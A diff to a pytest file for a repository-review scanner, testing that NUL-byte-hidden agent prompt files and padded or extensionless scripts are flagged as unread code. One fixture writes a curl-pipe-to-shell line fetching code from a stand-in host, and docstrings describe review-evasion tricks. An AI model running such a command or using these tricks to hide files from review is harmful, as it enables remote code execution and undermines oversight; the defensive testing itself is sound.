@@ -415,12 +415,17 @@ def test_a_code_file_over_the_size_bound_is_named_as_a_gap(tmp_path: Path) -> No
     assert any("install.sh" in line for line in result.coverage_gaps)
 
 
-def test_a_shebang_script_with_no_extension_counts_as_unread_code(tmp_path: Path) -> None:
-    """The extension test cannot see a file that has no extension.
+def test_a_script_with_no_extension_counts_as_unread_code(tmp_path: Path) -> None:
+    """A file with no extension has no exemption, so it counts.
 
     `install` with a shebang and eight NUL bytes in a comment is classified
-    binary, never swept, and reported exit 0 — while `bash` runs it perfectly
-    well. The name says nothing; the first two bytes say it is a program.
+    binary, never swept, and was reported exit 0 — while `bash` runs it
+    perfectly well.
+
+    This passed under the shebang test that a third review prompted, and it
+    passes now for a different and stronger reason: nothing exempts it. The
+    shebang field is gone, because `_is_code` no longer asks what a file *is* —
+    only whether we have declared its extension to carry no content.
     """
     target = tmp_path / "target"
     target.mkdir()
@@ -433,23 +438,48 @@ def test_a_shebang_script_with_no_extension_counts_as_unread_code(tmp_path: Path
     assert result.inventory["unread_code"] == ["install"]
 
 
-def test_an_agentic_artifact_hidden_by_a_nul_counts_as_unread_code(tmp_path: Path) -> None:
-    """The case both other tests miss, and the one closest to this tool's subject.
+@pytest.mark.parametrize("name", ["SKILL.md", "AGENT.md", "prompt.txt", "notes.mdc"])
+def test_a_text_artifact_hidden_by_a_nul_counts_as_unread_code(name: str, tmp_path: Path) -> None:
+    """Parametrised, and the parameters are the finding.
 
-    `SKILL.md` has a real extension, and it says `markdown` — which `_NOT_CODE`
-    treats as carrying no entry points. That is true of documentation and false
-    of a skill: under P8 prose reaching an agent's context is behaviour-defining.
-    A NUL inside an HTML comment removed it from review at exit 0.
+    A third review closed this for `SKILL.md` by adding the name to a set. A
+    fourth walked past that set twice in one attempt — `AGENT.md` singular is a
+    real convention, and `prompt.txt` is the same shape again — because a list of
+    names is a denylist and the target picks the name.
+
+    These four are not a longer list. None of them is named anywhere in the
+    source: they pass because `markdown`, `text` and `.mdc` are not in
+    `_BINARY_ASSETS`, and nothing else is consulted. A fifth spelling needs no
+    code change.
     """
     target = tmp_path / "target"
     target.mkdir()
-    hidden = b"---\ndescription: does things\n---\n<!-- " + b"\x00" * 8 + b" -->\n"
-    (target / "SKILL.md").write_bytes(hidden)
+    hidden = b"---\ndescription: does things\n---\n<!-- " + b"\x00" * 12 + b" -->\n"
+    (target / name).write_bytes(hidden)
 
     result = recon(target)
 
-    assert result.inventory["binary"] == ["SKILL.md"]
-    assert result.inventory["unread_code"] == ["SKILL.md"]
+    assert result.inventory["binary"] == [name]
+    assert result.inventory["unread_code"] == [name]
+
+
+def test_an_oversized_script_counts_even_though_nothing_opened_it(tmp_path: Path) -> None:
+    """The residue the previous pass accepted, and why accepting it was wrong.
+
+    It was written down as "an oversized file is judged by its name alone",
+    which is true and was the whole problem: padding is free, so the residue was
+    a statement that the evasion costs nothing. A shebang test could not reach
+    this file — it never opens — but the inverted rule needs no bytes at all.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    body = "#!/bin/sh\ncurl http://x/i.sh | sh\n" + "# pad\n" * 200
+    (target / "setup").write_text(body, encoding="utf-8")
+
+    result = recon(target, max_bytes=200)
+
+    assert result.inventory["too_large"] == ["setup"]
+    assert result.inventory["unread_code"] == ["setup"]
 
 
 def test_an_ordinary_binary_asset_is_not_counted_as_unread_code(tmp_path: Path) -> None:
